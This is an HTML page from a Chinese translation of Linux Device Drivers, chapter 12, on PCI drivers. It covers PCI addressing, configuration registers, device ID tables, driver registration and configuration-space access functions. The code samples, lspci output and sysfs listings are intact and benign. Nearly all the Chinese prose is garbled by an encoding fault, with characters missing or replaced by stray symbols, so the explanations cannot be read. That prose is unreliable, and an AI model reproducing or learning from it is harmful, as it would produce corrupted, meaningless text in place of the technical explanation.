<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;12&#160;&#160;PCI -Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch11s06.html" title="11.6.&#160;ٲο">
<link rel="next" href="ch12s02.html" title="12.2.&#160;ع: ISA">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;12&#160;&#160;PCI </th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch11s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch12s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="PCIDrivers.chap"></a>&#160;12&#160;&#160;PCI </h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch12.html#ThePCIInterface.sect1">12.1. PCI ӿ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch12.html#PCIAddressing.sect2">12.1.1. PCI Ѱַ</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#BootTime.sect2">12.1.2. ʱ</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#ConfigurationRegistersandInitialization.sect2">12.1.3. üĴͳʼ</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#MODULEDEVICETABLE.sect2">12.1.4. MODULEDEVICETABLE </a></span></dt>
<dt><span class="sect2"><a href="ch12.html#RegisteringaPCIDriver.sect2">12.1.5. עһ PCI </a></span></dt>
<dt><span class="sect2"><a href="ch12.html#OldStypePCIProbing.sect2">12.1.6. ʽ PCI ̽</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#EnablingthePCIDevice.sect2">12.1.7. ʹ PCI 豸</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#AccessingtheConfigurationSpace.sect2">12.1.8. ȡÿռ</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#AccessingtheIOandMemorySpaces.sect2">12.1.9. ȡ I/O ڴռ</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#PCIInterrupts.sect2">12.1.10. PCI ж</a></span></dt>
<dt><span class="sect2"><a href="ch12.html#HardwareAbstractions.sect2">12.1.11. Ӳ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch12s02.html">12.2. ع: ISA</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch12s02.html#HardwareResources.sect2">12.2.1. ӲԴ</a></span></dt>
<dt><span class="sect2"><a href="ch12s02.html#ISAProgramming.sect2">12.2.2. ISA </a></span></dt>
<dt><span class="sect2"><a href="ch12s02.html#ThePlugandPlaySpecification.sect2">12.2.3. 弴ù淶</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch12s03.html">12.3. PC/104  PC/104+</a></span></dt>
<dt><span class="sect1"><a href="ch12s04.html">12.4.  PC </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch12s04.html#MCA.sect2">12.4.1. MCA </a></span></dt>
<dt><span class="sect2"><a href="ch12s04.html#EISA.sect2">12.4.2. EISA </a></span></dt>
<dt><span class="sect2"><a href="ch12s04.html#VLB.sect2">12.4.3. VLB </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch12s05.html">12.5. SBus</a></span></dt>
<dt><span class="sect1"><a href="ch12s06.html">12.6. NuBus </a></span></dt>
<dt><span class="sect1"><a href="ch12s07.html">12.7. ⲿ</a></span></dt>
<dt><span class="sect1"><a href="ch12s08.html">12.8. ٲο</a></span></dt>
</dl>
</div>
<p>Ȼ 9 ½ӲƵͲ, ṩ߽ṹĸ߼һЩĸ. һɵ·ӿںһ̽ӿ. ڱ, 漰̽ӿ.</p>
<p>漰߽ṹ. , ҪĽڴȡ PCI ں˺, Ϊ PCI ͸ļձʹõ. Ǳںֵ֧õ. ISA ڵӰȻձ, ں, һ¶͵, ûиҪ, ڵ 9 º͵ 10 ºǵ.</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="ThePCIInterface.sect1"></a>12.1.&#160;PCI ӿ</h2></div></div></div>
<p>ûΪ PCI һֵ·߷, ʵһĹ, һĲͬӦν.</p>
<p>PCI 淶漰ͼӿصĴ󲿷. ǲﺭȫ; ڱ, Ҫעһ PCI ҵӲöĴȡ. ڵ 2 µ"ģ"һں͵ 10 µ"Զ̽ IRQ "һ۵̽⼼ɱ PCI 豸, 淶ṩһʺ̽ѡ.</p>
<p>PCI ϵΪ ISA ׼Ʒ,  3 ҪĿ: ڼ֮䴫ʱøõ, ƽ̨޹, ԼӺȥϵͳ.</p>
<p>PCI ͨʹһ ISA ߵʱƵ, øõ;  25  33 MHz (ʵƵϵͳʱӵһ), Լ 66-MHz  133-MHz ʵҲѾ. , 䱸 32-λ , һ 64-λչѾڹ淶. ƽ̨ԳһƵĿ,  PCI һرҪ, Ϊ PC һֱضĽӿڱ׼ռ. PCI ǰ㷺IA-32, Alpha, PowerPC, SPARC64,  IA-64 ϵͳ, ԼһЩƽ̨.</p>
<p>, ص,  PCI ԽӿڰԶ֧̽. PCI 豸ߵ(󲿷ֵʽ)ʱԶõ. , 豸ܹȡ豸еϢԱɳʼ. ⲻýκ̽.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PCIAddressing.sect2"></a>12.1.1.&#160;PCI Ѱַ</h3></div></div></div>
<p>ÿ PCI һߺ, һ豸, һܺűʶ. PCI 淶ϵͳռö 256 , Ϊ 256 ߶ϵͳǲ, Linux ֧ PCI . ÿ PCI ռö 256 . ÿռ 32 豸, ÿ豸һ๦ܿ(һ豸, һӵ CD-ROM ) 8 . , ÿܿӲαһ 16-λַ key , ʶ. Linux 豸д, Ȼ, ҪЩƵַ, Ϊʹһضݽṹ, Ϊ pci_dev, 豸ϲ. </p>
<p>󲿷ֽڵĹվ 2  PCI . ڵϵͳ 1 Ҫͨʵ, ; PCI , Ĺ 2 . һ PCI ϵͳȫֲһ, ÿ߶ӵһϲ, ֱ 0 . CardBus PC-card ϵͳҲͨӵ PCI ϵͳ. ͼ<a href="ch12.html#ldd3-12-1.fig" title="ͼ&#160;12.1.&#160;һ PCI ϵͳĲ">һ PCI ϵͳĲ</a>ʾһ͵ PCI ϵͳ, иűͻʾ.</p>
<div class="figure">
<a name="ldd3-12-1.fig"></a><p class="title"><b>ͼ&#160;12.1.&#160;һ PCI ϵͳĲ</b></p>
<div><img src="images/snagitldd3/ldd3-12-1.png" alt="һ PCI ϵͳĲ"></div>
</div>
<p> PCI ص 16-λӲַ, ܴ󲿷 struct pci_dev ṹ, Ȼǿż, رǵʹ豸б. һ lspci ( pciutils һ, ڴ󲿷ַж) /proc/pci  /porc/bus/pci еϢŲ. PCI 豸 sysfs ʾҲʾѰַ,  PCI Ϣ. <sup>[<a name="id469697" href="#ftn.id469697">40</a>]</sup>ʾӲַʱ, ɱʾΪ 2 ֵ( һ 8-λߺźһ 8-λ 豸͹ܺ), Ϊ 3 ֵ( bus, device,  function), Ϊ 4 ֵ(domain, bus, device,  function); еֵ 16 ʾ.</p>
<p>, /proc/bus/pci/devices ʹһ 16-λ ֶ(ڷ),  /proc/bus/busnumber ֵַΪ 3 ֶ. ʾЩַʾ, ֻʾеĿʼ:</p>
<pre class="screen">
$ lspci | cut -d: -f1-3
0000:00:00.0 Host bridge
0000:00:00.1 RAM memory
0000:00:00.2 RAM memory
0000:00:02.0 USB Controller
0000:00:04.0 Multimedia audio controller
0000:00:06.0 Bridge
0000:00:07.0 ISA bridge
0000:00:09.0 USB Controller
0000:00:09.1 USB Controller
0000:00:09.2 USB Controller
0000:00:0c.0 CardBus bridge
0000:00:0f.0 IDE interface
0000:00:10.0 Ethernet controller
0000:00:12.0 Network controller
0000:00:13.0 FireWire (IEEE 1394)
0000:00:14.0 VGA compatible controller
$ cat /proc/bus/pci/devices | cut -f1
0000
0001
0002
0010
0020
0030
0038
0048
0049
004a
0060
0078
0080
0090
0098
00a0
$ tree /sys/bus/pci/devices/
/sys/bus/pci/devices/
|-- 0000:00:00.0 -&gt; ../../../devices/pci0000:00/0000:00:00.0
|-- 0000:00:00.1 -&gt; ../../../devices/pci0000:00/0000:00:00.1
|-- 0000:00:00.2 -&gt; ../../../devices/pci0000:00/0000:00:00.2
|-- 0000:00:02.0 -&gt; ../../../devices/pci0000:00/0000:00:02.0
|-- 0000:00:04.0 -&gt; ../../../devices/pci0000:00/0000:00:04.0
|-- 0000:00:06.0 -&gt; ../../../devices/pci0000:00/0000:00:06.0
|-- 0000:00:07.0 -&gt; ../../../devices/pci0000:00/0000:00:07.0
|-- 0000:00:09.0 -&gt; ../../../devices/pci0000:00/0000:00:09.0
|-- 0000:00:09.1 -&gt; ../../../devices/pci0000:00/0000:00:09.1
|-- 0000:00:09.2 -&gt; ../../../devices/pci0000:00/0000:00:09.2
|-- 0000:00:0c.0 -&gt; ../../../devices/pci0000:00/0000:00:0c.0
|-- 0000:00:0f.0 -&gt; ../../../devices/pci0000:00/0000:00:0f.0
|-- 0000:00:10.0 -&gt; ../../../devices/pci0000:00/0000:00:10.0
|-- 0000:00:12.0 -&gt; ../../../devices/pci0000:00/0000:00:12.0
|-- 0000:00:13.0 -&gt; ../../../devices/pci0000:00/0000:00:13.0
`-- 0000:00:14.0 -&gt; ../../../devices/pci0000:00/0000:00:14.0
</pre>
<p>е 3 豸бͬ˳, Ϊ lspci ʹ /proc ļΪϢԴ.  VGA Ƶһ, 0x00a ˼ 0000:00:14.0 Ϊ(16λ), (8λ), 豸(5λ)͹(3λ).</p>
<p>ÿӲ·Ӧѯ, ̶ 3 ַռ: ڴλ, I/O ˿, üĴ. ǰ 2 ַռͬһ PCI ϵ豸(, ȡһڴλ, Ǹ PCI ϵе豸ͬһʱ䶼). ÿռ, , õʽѰַ. ֻһһ۵زѯַ, ǴӲͻ.</p>
<p>, ڴ I/O ͨķ, ͨ inb, readb, ȵȡ. һ, ôͨں˺ȡüĴ. ǵж, ÿ PCI  4 жϽ, ÿ豸ܿʹеһ, عЩ CPU. Ǽƽ̨β PCI ֮ʵֵ. Ϊ PCI 淶Ҫжǿɹ, һ޵ IRQ ,  x86, פ PCI ӿڰ( ÿ 4 жϽ).</p>
<p>PCI ߵ I/O ռʹһ 32-λַ(  4 GB  I/O ˿), ڴռʹ 32-λ 64-λַȡ. 64-λַڴ󲿷ֽڵƽ̨Ͽ. ַÿ豸Ψһ, ܴ 2 豸ͬĵַ, ʹòܴȡκһ. ⲻ, һŪӦļĴ. Ϣÿɽӿڰṩڴ I/O ַɱӳ, ͨý. , ϵͳʱ̼ʼ PCI Ӳ, ӳÿַͬͻ.<sup>[<a name="id469764" href="#ftn.id469764">41</a>]</sup>Щǰӳ䵽ĵַɴÿռ,  Linux ɴȡ豸̽. ڶȡüĴ, ɰȫشȡӲ.</p>
<p>PCI ÿռΪÿ豸 256 ֽ( PCI Express 豸, , ÿ 4 KB ÿռ), üĴŲǱ׼. ÿռ 4 ֽںһΨһĹ ID, ɱʶ豸, ͨǸ豸ض ID.<sup>[<a name="id469852" href="#ftn.id469852">42</a>]</sup> ֮, ÿ豸屻ʽѰַȡüĴ; ЩĴеϢɽű I/O ȡ, ؽһĵʽѰַ. </p>
<p>Ӧ, PCI ӿڱ׼Ա ISA ҪĴõַռ. , ͨ, һ PCI Ҫȡÿռ, Ϊ˴ðյ̽нԼ.</p>
<p>µʣಿ, ʹô豸ָһ豸, Ϊڶ๦ܰÿͬһʵ. һ豸, ǵ˼", ߺ, 豸, ͹ܺ".</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="BootTime.sect2"></a>12.1.2.&#160;ʱ</h3></div></div></div>
<p>Ϊ PCI ι, Ǵϵͳʼ, Ϊ豸õʱ.</p>
<p>һPCI豸ϵʱ, ӲַǼ. 仰˵, 豸ֻӦý. ϵʱ, 豸ûڴ沢û I/O ˿ڱӳڼĵַռ; ÿ豸ض, жϱ, Ҳر.</p>
<p>˵, ÿ PCI 嶼װʶ PCI ̼, Ϊ BIOS, NVRAM,  PROM, ƽ̨. ̼ṩ豸õַռĴȡ, ͨд PCI еļĴ.</p>
<p>ϵͳʱ, ̼( Linux ں, ó)ÿ PCI ý, Ϊ˷һȫλøÿṩĵַ. ȡ豸ʱ, ڴI/OѾӳ䵽ĵַռ. ɸıȱʡķ, ӲҪ.</p>
<p>ͬһ, ûɲ鿴 PCI 豸б豸üĴ, ͨ /proc/bus/pcidevices  /proc/bus/pci/*/*. ǰһ(16)豸Ϣıļ, ҺǶļÿ豸ÿüĴһ, ÿ豸һļ.  sysfs Ŀ¼еĵ PCI 豸Ŀ¼ /sys/bus/pci/devices ҵ. һ PCI 豸Ŀ¼಻ͬļ:</p>
<pre class="screen">
$ tree /sys/bus/pci/devices/0000:00:10.0
/sys/bus/pci/devices/0000:00:10.0
|-- class
|-- config
|-- detach_state
|-- device
|-- irq
|-- power
| `-- state
|-- resource
|-- subsystem_device
|-- subsystem_vendor
`-- vendor
</pre>
<p>ļ config һļ, ԭʼ PCI Ϣ豸ж( /proc/bus/pci/*/* ṩһ). ļ verndor, subsytem_device, subsystem_vernder,  class ָ PCI 豸ضֵ( е PCI 豸ṩϢ). ļ irq ʾ PCI 豸ĵǰ IRQ, ļ resource ʾ豸ĵǰڴԴ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ConfigurationRegistersandInitialization.sect2"></a>12.1.3.&#160;üĴͳʼ</h3></div></div></div>
<p>, ǿ PCI 豸üĴ. е PCI 豸һ 256-ֽ ַռ. ǰ 64 ֽǱ׼, ʣµ豸. ͼ <a href="ch12.html#ldd3-12-2.fig" title="ͼ&#160;12.2.&#160;׼ PCI üĴ">׼ PCI üĴ</a>ʾ豸ÿռŲ.</p>
<div class="figure">
<a name="ldd3-12-2.fig"></a><p class="title"><b>ͼ&#160;12.2.&#160;׼ PCI üĴ</b></p>
<div><img src="images/snagitldd3/ldd3-12-2.png" alt="׼ PCI üĴ"></div>
</div>
<p>ͼʾ, һЩ PCI üĴҪ, һЩǿѡ. ÿ PCI 豸ֵڱҪļĴ, ѡĴʵʹ. ѡֶβʹ, ǱҪֶεָЧ. , ҪֶưĹ, ֶǷ.</p>
<p>ע PCI ĴһֱСģʽ. ܱ׼Ϊϵ, PCI ʱ¶һЩ PC . дӦСĴֽ, ȡֽüĴʱ;  PC ʹõĴƽ̨ϲ. Linux Ѿֽ(һ, "ȡÿռ"), ס. Ҫתݴ PCI , ߷֮,  &lt;asm/byteorder.h&gt; жĺ, ڵ 11 ½, ֪ PCI ֽС.</p>
<p>е˱ķΧ. , ÿ豸ļĵֵ֧ļĴ. ǸȤһ֪豸Լܴȡ豸ÿռ.</p>
<p>3  4  PCI Ĵʶһ豸: verdorID, deviceID,  class  3 õ. ÿ PCI ̷ȷֵЩֻĴ, ʹ豸. , ֶ subsystem verdorID  subsystem deviceID ʱӦһƵ豸.</p>
<p>ǿЩĴϸ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>vendorID </span></span></dt>
<dd><p> 16-λ ĴʶһӲ. , ÿ Intel 豸ͬĹӦ̺, 0x8086. ĺһȫע,  PCI رά, ҹӦ̱һΨһķǵĺ.</p></dd>
<dt><span class="term"><span>deviceID </span></span></dt>
<dd><p>һ 16-λ Ĵ, ɹӦѡ; 豸 ID ûҪٷע.  ID  Ӧ ID ɶԳһΨһ 32-λ ʶһӲ豸. ʹô"ǩ"ָӦ̺豸 ID . һ豸ǩʶ豸; ӲֲҵĿ豸ҪѰҵֵ.</p></dd>
<dt><span class="term"><span>class </span></span></dt>
<dd><p>ÿ趼һ. Ĵһ 16-λ ֵ, ĸ 8 λʶ""(Ⱥ). , "ethernet""token ring" 2 ඼"network"Ⱥ, "serial""parallel""communication"Ⱥ. һЩּ֧Ƶ豸, ÿһͬǩǶͬ; ЩĴʶǵ, ʾ.</p></dd>
<dt><span class="term"><span>subsystem vendorID</span></span></dt>
<dd></dd>
<dt><span class="term"><span>subsystem deviceID </span></span></dt>
<dd><p>Щֶοһʶһ豸. оƬڱһͨýӿоƬ, ڼȫͬĵط, ʶ֮ͨʵ豸. ϵͳ־Ŀ.</p></dd>
</dl></div>
<p>ʹЩͬıʶ, һ PCI ɸ֪ں֧ʲô͵豸. struct pci_device_id ṹһֵ֧Ĳͬ PCI 豸б. ṹͬĳԱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>__u32 vendor;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>__u32 device;</span></span></dt>
<dd><p>Щָһ豸 PCI Ӧ̺豸 ID. ɴκιӦ̻豸 ID, ֵ PCI_ANY_ID ӦЩԱ.</p></dd>
<dt><span class="term"><span>__u32 subvendor;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>__u32 subdevice;</span></span></dt>
<dd><p>Щָһ豸 PCI ϵͳӦ̺ϵͳ豸 ID. ɴκ͵ϵͳ ID, ֵ PCI_ANY_ID ӦЩԱ.</p></dd>
<dt><span class="term"><span>__u32 class;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>__u32 class_mask;</span></span></dt>
<dd><p> 2 ֵָ֧һ PCI 豸. ͬ PCI 豸( һ VAG һ ) PCI 淶ﱻ. һɴκϵͳ ID, ֵ PCI_ANY_ID ӦЩֶ.</p></dd>
<dt><span class="term"><span>kernel_ulong_t driver_data;</span></span></dt>
<dd><p>ֵƥһ豸, Ϣ, PCI ֲͬ豸, .</p></dd>
</dl></div>
<p> 2 궨Ӧʼһ struct pci_device_id ṹ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>PCI_DEVICE(vendor, device)</span></span></dt>
<dd><p>һ struct pci_device_id , ֻƥضĹӦ̺豸 ID. ṹӹӦ̺豸ԱΪ PCI_ANY_ID.</p></dd>
<dt><span class="term"><span>PCI_DEVICE_CLASS(device_class, device_class_mask)</span></span></dt>
<dd><p>һ struct pci_device_id, ƥһض PCI .</p></dd>
</dl></div>
<p>һʹЩһֵ֧豸͵, ںļпҵ:</p>
<pre class="programlisting">
drivers/usb/host/ehci-hcd.c: 
static const struct pci_device_id pci_ids[] = { {
 /* handle any USB 2.0 EHCI controller */
 PCI_DEVICE_CLASS(((PCI_CLASS_SERIAL_USB &lt;&lt; 8) | 0x20), ~0),
 .driver_data = (unsigned long) &amp;ehci_driver,
 },
 { /* end: all zeroes */ }

}; 
drivers/i2c/busses/i2c-i810.c: 

static struct pci_device_id i810_ids[] = {
 { PCI_DEVICE(PCI_VENDOR_ID_INTEL, PCI_DEVICE_ID_INTEL_82810_IG1) },
 { PCI_DEVICE(PCI_VENDOR_ID_INTEL, PCI_DEVICE_ID_INTEL_82810_IG3) },
 { PCI_DEVICE(PCI_VENDOR_ID_INTEL, PCI_DEVICE_ID_INTEL_82810E_IG) },
 { PCI_DEVICE(PCI_VENDOR_ID_INTEL, PCI_DEVICE_ID_INTEL_82815_CGC) },
 { PCI_DEVICE(PCI_VENDOR_ID_INTEL, PCI_DEVICE_ID_INTEL_82845G_IG) },
 { 0, }, 
}; 
</pre>
<p>ЩӴһ struct pci_device_id ṹб, бһǱΪȫĵĿսṹ.  ID  struct pci_driver (潲), ûռض֧ĸ豸.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="MODULEDEVICETABLE.sect2"></a>12.1.4.&#160;MODULEDEVICETABLE </h3></div></div></div>
<p> pci_device_id ṹҪûռ, Ȳκģϵͳ֪ʲôģʹʲôӲ豸.  MODULE_DEVICE_TABLE . :</p>
<pre class="programlisting">
MODULE_DEVICE_TABLE(pci, i810_ids); 
</pre>
<p>䴴һֲΪ __mod_pci_device_table, ָ struct pci_device_id б. Ժں˽, depmod еģѰ __mod_pci_device_table. ҵ, ģ鲢ӵļ /lib/modules/KERNEL_VERSION/modules.pcimap.  depmod ɺ, еıںеģֵ֧ PCI 豸г, ǵģ, Ǹļ. ں˸֪Ȳϵͳµ PCI 豸ҵ, Ȳϵͳʹ moudles.pcimap ļҵȷ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="RegisteringaPCIDriver.sect2"></a>12.1.5.&#160;עһ PCI </h3></div></div></div>
<p>Ϊ˱ȷעᵽں, е PCI 봴ṹ struct pci_driver ṹ. ṹຯصͱ,  PCI  PCI . ṹһ PCI Ҫ֪ĳԱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>const char *name;</span></span></dt>
<dd><p>. Ψһ, ں PCI . ͨΪģͬ. ʾ sysfs  /sys/bus/pci/drivers/ , ںʱ.</p></dd>
<dt><span class="term"><span>const struct pci_device_id *id_table;</span></span></dt>
<dd><p>ָ struct pci_device_id ָ, ڱº.</p></dd>
<dt><span class="term"><span>int (*probe) (struct pci_dev *dev, const struct pci_device_id *id);</span></span></dt>
<dd><p>ָ PCI  probe ָ.  PCI ĵ, һΪƵ struct pci_dev ʱ. һָ struct pci_device_id ָ, PCI , Ҳݸ.  PCI Ҫݸ struct pci_dev, Ӧȷʼ豸ҷ 0. ӵ豸, ߲һ, ӦһĴֵ. ĸϸڱº. </p></dd>
<dt><span class="term"><span>void (*remove) (struct pci_dev *dev);</span></span></dt>
<dd><p>ָ PCI  struct pci_dev ϵͳȥʱõĺָ, ߵ PCI ںжʱ. ĸϸڱº. </p></dd>
<dt><span class="term"><span>int (*suspend) (struct pci_dev *dev, u32 state);</span></span></dt>
<dd><p> struct pci_dev ʱ PCI ĵõĺָ. ״̬ state ﴫ. ǿѡ; һṩ.</p></dd>
<dt><span class="term"><span>int (*resume) (struct pci_dev *dev);</span></span></dt>
<dd><p> pci_dev ָʱ PCI ĵõĺָ. һֱڵù֮. ʱѡ; һṩ.</p></dd>
</dl></div>
<p>֮, Ϊһȷ struct pci_driver ṹ, ֻ 4 ֶҪʼ:</p>
<pre class="programlisting">
static struct pci_driver pci_driver = {
 .name = "pci_skel",
 .id_table = ids,
 .probe = probe,
 .remove = remove,
}; 
</pre>
<p>Ϊע struct pci_driver  PCI , һָ struct pci_driver ָ pci_register_driver. ͳ PCI ģʼ:</p>
<pre class="programlisting">
static int __init pci_skel_init(void)
{
 return pci_register_driver(&amp;pci_driver);
}
</pre>
<p>ע, pci_register_driver ҪôһĴ, Ҫô 0 жɹע. ذ󶨵ϵ豸,һû豸󶨵.  2.6 ֮ǰں˵һı, Ϊе:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>֧ PCI Ȳεϵͳ,  CardBus ϵͳ, һ PCI 豸κʱֻʧ. 豸ǰа, Լʼһ豸ʱ.</p></li>
<li><p>2.6 ں PCI ID ̬طһ, ֮. ͨ sysfs е PCI Ŀ¼ļ new_id ɵ. һ豸ڱʹöں˶֪ʱ, Ƿǳõ. һûд PCI ID ֵ new_id ļ, ҽ󶨵豸. һֱһ豸ϵͳг, ӿڽܹ.</p></li>
</ul></div>
<p> PCI ж, struct pci_drive Ҫںע. ͨ pci_unregister_driver . , κεǰ󶨵 PCI 豸ȥ,  PCI  remove  pci_unregister_driver ֮ǰ.</p>
<pre class="programlisting">
static void __exit pci_skel_exit(void)
{

 pci_unregister_driver(&amp;pci_driver);
}
</pre>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="OldStypePCIProbing.sect2"></a>12.1.6.&#160;ʽ PCI ̽</h3></div></div></div>
<p>ϵں˰汾,  pci_register_driver, һֱ PCI ʹ. ෴, Ҫôֹϵͳе PCI 豸б, Ҫôǽһܹһض PCI 豸ĺ. ϵͳ PCI 豸бѱ 2.6 ںȥ, Ϊֹƻں, ż޸ PCI 豸бһ豸ͬʱȥʱ.</p>
<p>һض PCI 豸Ҫ, еĺ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>struct pci_dev *pci_get_device(unsigned int vendor, unsigned int device, struct pci_dev *from);</span></span></dt>
<dd>
<p>ɨ赱ǰϵͳ PCI 豸б, ƥָĹӦ̺豸 ID,  struct pci_dev  found еü, ҷ. ֹṹûκ֪ͨʧ, ȷں˲ oops. ص struct pci_dev, ú pci_dev_put ȷصݼʹü, ں豸ȥ. from ͬһǩõ豸; Ӧָѱҵһ豸, Աܹ, شбͷʼ. Ϊҵһ豸, from ָΪ NULL. ûҵ(һ)豸,  NULL.</p>
<p></p>
<p>һȷʹ:</p>
<pre class="programlisting">
struct pci_dev *dev;
dev = pci_get_device(PCI_VENDOR_FOO, PCI_DEVICE_FOO, NULL);
if (dev)
{
        /* Use the PCI device */
        ...
        pci_dev_put(dev);
}
</pre>
<p>ܴжб. , һ汻ӡϵͳ־.</p>
</dd>
<dt><span class="term"><span>struct pci_dev *pci_get_subsys(unsigned int vendor, unsigned int device, unsigned int ss_vendor, unsigned int ss_device, struct pci_dev *from);</span></span></dt>
<dd><p> pci_get_device һ, Ѱ豸ʱָϵͳӦ̺ϵͳ豸 ID. ܴжĵ. , һ汻ӡϵͳ־.</p></dd>
<dt><span class="term"><span>struct pci_dev *pci_get_slot(struct pci_bus *bus, unsigned int devfn);</span></span></dt>
<dd><p>ϵͳе PCI 豸б, ָ struct pci_bus , һָ PCI 豸豸͹ܺ. ҵһƥ豸, üҷָһָ. ɴȡ struct pci_dev,  pci_dev_put.</p></dd>
</dl></div>
<p>ָܴжĵ. , һ汻ӡϵͳ־.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="EnablingthePCIDevice.sect2"></a>12.1.7.&#160;ʹ PCI 豸</h3></div></div></div>
<p> PCI ̽⺯, ɴȡ PCI 豸κ豸Դ(I/O ж)֮ǰ,  pci_enable_device :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>int pci_enable_device(struct pci_dev *dev);</span></span></dt>
<dd><p>ʵʹ豸. 豸ԼĳЩҲжߺ I/O . , ⷢ CardBus 豸(Ѿȫ PCI ͬ).</p></dd>
</dl></div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AccessingtheConfigurationSpace.sect2"></a>12.1.8.&#160;ȡÿռ</h3></div></div></div>
<p>̽⵽豸, Ҫд 3 ַռ: ڴ, ˿, . ر, ȡÿռҪ, ΪΨһҵ豸ӳ䵽ڴ I/O ռλõķ.</p>
<p>Ϊ΢޷ֱӴȡÿռ, Ӧ̲òṩһ. Ϊȡÿռ, CPU дͶ PCI еļĴ, ȷеʵڹӦ̵, Һ޹, Ϊ Linuxṩһ׼ӿȡÿռ.</p>
<p>, ÿռͨ8-λ, 16-λ,  32-λݴȡ. صĺԭͶ &lt;linux/pci.h&gt;:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>int pci_read_config_byte(struct pci_dev *dev, int where, u8 *val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_read_config_word(struct pci_dev *dev, int where, u16 *val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_read_config_dword(struct pci_dev *dev, int where, u32 *val);</span></span></dt>
<dd><p> dev ʶ豸ÿռ 1 , 2  4 ֽ. where Ǵÿռ俪ʼֽƫ. ÿռȡõֵͨ val ָ뷵, ķֵһ. word  dword תոնֵС˵ıֽ, 㲻شֽ.</p></dd>
<dt><span class="term"><span>int pci_write_config_byte(struct pci_dev *dev, int where, u8 val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_write_config_word(struct pci_dev *dev, int where, u16 val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_write_config_dword(struct pci_dev *dev, int where, u32 val);</span></span></dt>
<dd><p>д 1 , 2  4 ֽڵÿռ. ͨһ, 豸 dev ʶ, ͨһдֵ. word  dword תֵС, д֮ǰ.</p></dd>
</dl></div>
<p>е֮ǰĺʵΪк. ʹЩЩ, κرʱ̲ܼʱȡ struct pci_dev :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>int pci_bus_read_config_byte (struct pci_bus *bus, unsigned int devfn, int where, u8 *val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_bus_read_config_word (struct pci_bus *bus, unsigned int devfn, int where, u16 *val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_bus_read_config_dword (struct pci_bus *bus, unsigned int devfn, int where, u32 *val);</span></span></dt>
<dd><p> pci_read_function һ,  struct pci_bus *  devfn Ҫ struct pci_dev *.</p></dd>
<dt><span class="term"><span>int pci_bus_write_config_byte (struct pci_bus *bus, unsigned int devfn, int where, u8 val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_bus_write_config_word (struct pci_bus *bus, unsigned int devfn, int where, u16 val);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int pci_bus_write_config_dword (struct pci_bus *bus, unsigned int devfn, int where, u32 val);</span></span></dt>
<dd><p>ͬ pci_write_ ,  struct pci_bus *  devfn Ҫ struct pci_dev *.</p></dd>
</dl></div>
